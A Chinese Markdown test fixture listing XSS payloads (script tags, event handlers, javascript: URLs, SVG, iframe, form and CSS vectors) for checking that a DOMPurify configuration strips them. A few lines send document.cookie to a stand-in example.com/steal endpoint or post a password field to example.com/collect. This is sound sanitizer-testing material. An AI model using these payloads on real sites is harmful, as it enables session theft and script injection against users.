# 危险 HTML 攻击样例（专放）

> 本文件专门收集危险 HTML / XSS 攻击样例，供阶段 4 安全加固与 F-038 验收使用。
> 预期行为：经 DOMPurify（`USE_PROFILES:{html:true}`，`FORBID_TAGS: script/iframe/object/embed/form/link/meta/base`）
> 消毒后，**所有攻击载荷均被清除或无害化，不得执行任何脚本**。
> 本文件不得作为正常内容复制到公众号；仅用于在受控浏览器中验证消毒结果（检查预览 DOM 是否残留危险节点/属性）。
> regression.md 中也内嵌了其中一部分常用样例，本文件覆盖更完整的攻击面。

## 1. script 标签

<script>alert("XSS-1")</script>

<script src="https://example.com/evil.js"></script>

<ScRiPt>alert("XSS-1b 大小写混淆")</ScRiPt>

<script>
  // 多行 script
  document.location = "https://example.com/steal?c=" + document.cookie;
</script>

## 2. 事件处理器属性

<img src="x" onerror="alert('XSS-2-img-onerror')">

<img src="https://example.com/ok.png" onerror="alert('XSS-2b')" onload="alert('XSS-2c')">

<div onclick="alert('XSS-2d')">点击触发 onclick</div>

<div onmouseover="alert('XSS-2e')" onfocus="alert('XSS-2f')" tabindex="0">悬停/聚焦触发</div>

<body onload="alert('XSS-2g')">

<a href="https://example.com" onclick="alert('XSS-2h')">带 onclick 的链接</a>

<details open ontoggle="alert('XSS-2i')"><summary>ontoggle</summary>内容</details>

<input onfocus="alert('XSS-2j')" autofocus>

<video><source onerror="alert('XSS-2k')"></video>

## 3. javascript: / data: / vbscript: URL

<a href="javascript:alert('XSS-3a')">javascript: 链接</a>

<a href="JaVaScRiPt:alert('XSS-3b')">大小写混淆</a>

<a href="   javascript:alert('XSS-3c')">前导空格</a>

<a href="java&#115;cript:alert('XSS-3d')">实体编码</a>

<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data:text/html 链接</a>

<a href="vbscript:msgbox('XSS-3e')">vbscript: 链接</a>

<a href="https://example.com" style="x:expression(alert('XSS-3f'))">CSS expression</a>

<img src="javascript:alert('XSS-3g')">

<iframe src="javascript:alert('XSS-3h')"></iframe>

## 4. SVG 攻击面

<svg onload="alert('XSS-4a')"><circle r="10"/></svg>

<svg><script>alert("XSS-4b")</script></svg>

<svg><a xlink:href="javascript:alert('XSS-4c')"><text>点击</text></a></svg>

<svg><animate onbegin="alert('XSS-4d')" attributeName="x" dur="1s"/></svg>

<svg><foreignObject><div onclick="alert('XSS-4e')">foreignObject</div></foreignObject></svg>

<math><mi//xlink:href="data:x,<script>alert('XSS-4f')</script>">

<svg><style><img src="x" onerror="alert('XSS-4g')"></style></svg>

## 5. iframe / object / embed

<iframe src="https://example.com"></iframe>

<iframe srcdoc="<script>alert('XSS-5a')</script>"></iframe>

<object data="https://example.com/x.swf"></object>

<embed src="https://example.com/x.swf">

<object><param name="x" value="y"></object>

## 6. form / base / link / meta

<form action="https://example.com/collect"><input type="text" name="password" value="secret"></form>

<form><button formaction="javascript:alert('XSS-6a')">提交</button></form>

<base href="https://example.com/evil/">

<link rel="stylesheet" href="https://example.com/evil.css">

<meta http-equiv="refresh" content="0;url=https://example.com">

<meta charset="utf-8">

## 7. style 标签与 CSS 注入

<style>body{background:red}</style>

<style><img src="x" onerror="alert('XSS-7a')"></style>

<div style="background-image:url(javascript:alert('XSS-7b'))">CSS url 注入</div>

<div style="width:expression(alert('XSS-7c'))">IE expression</div>

## 8. 嵌套 / 畸形 / 注释混淆

<<script>alert("XSS-8a");//<</script>

<script><script>alert("XSS-8b")</script>

<!-- <script>alert("XSS-8c")</script> -->

<img src="x:x" onerror="alert('XSS-8d')">

<img src="x" `onerror="alert('XSS-8e')">

<scr<script>ipt>alert("XSS-8f")</scr</script>ipt>

<div><script>alert("XSS-8g")</script></div>

## 9. 模板 / 表达式注入尝试（应按纯文本处理）

${alert("XSS-9a")}

{{alert("XSS-9b")}}

<% alert("XSS-9c") %>

#{alert("XSS-9d")}

## 10. 合法对照（预期保留，不应被误删）

<a href="https://example.com">普通外链</a>

<a href="https://mp.weixin.qq.com/s/test">公众号链接</a>

<img src="https://picsum.photos/seed/safe/200/100" alt="普通外链图片">

<div align="center">align 属性（ADD_ATTR 白名单）</div>

<b>粗体</b> <i>斜体</i> <u>下划线</u> <mark>高亮</mark> <code>代码</code>

<table><tr><th>表头</th></tr><tr><td>单元格</td></tr></table>

<details><summary>合法 details</summary>内容</details>
